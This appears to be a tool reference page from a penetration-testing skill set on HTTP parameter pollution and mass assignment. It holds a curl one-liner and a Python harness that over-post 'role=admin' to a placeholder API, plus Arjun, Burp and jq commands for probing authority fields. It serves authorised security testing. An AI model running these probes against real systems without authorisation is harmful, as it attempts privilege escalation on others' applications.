# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`http-parameter-pollution-and-mass-assignment`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -b jar.txt -X POST 'https://target.example/api/me' --data 'display_name=probe&role=admin' && curl -sS -b jar.txt 'https://target.example/api/me'` | Over-post one authority field then read the record back so a persisted change is attributable to that field | Cross-platform |
| `Arjun` | `arjun -u 'https://target.example/api/me' -m POST` | Enumerate undocumented bindable parameters before testing which are server-authoritative | Linux, macOS, Windows |
| `Burp Suite Repeater` | `Duplicate a parameter in the raw request and toggle its second value between sends` | Reproduce the duplicate-key differential on one connection so parser selection is visible | Cross-platform |
| `jq` | `jq ".role, .tenant_id, .verified" <(curl -sS -b jar.txt https://target.example/api/me)` | Read the stored authority fields directly so comparison is on persisted values, not the rendered page | Cross-platform |

## Minimal Script Shape

An over-posting harness: it reads the caller's own record, submits an update with one authority field added, reads the record again, and reports a mass-assignment finding only when that server-authoritative field actually changed.

```python
import json
import urllib.parse
import urllib.request

BASE = "https://target.example"
COOKIE = "session=<authorised-session>"
FIELD = "role"

def call(method, path, body=None):
    data = urllib.parse.urlencode(body).encode() if body else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Cookie", COOKIE)
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())

before = call("GET", "/api/me")
call("POST", "/api/me", {"display_name": "probe", FIELD: "admin"})
after = call("GET", "/api/me")
changed = before.get(FIELD) != after.get(FIELD)
print({"field": FIELD, "before": before.get(FIELD), "after": after.get(FIELD),
       "mass_assignment": changed})
```
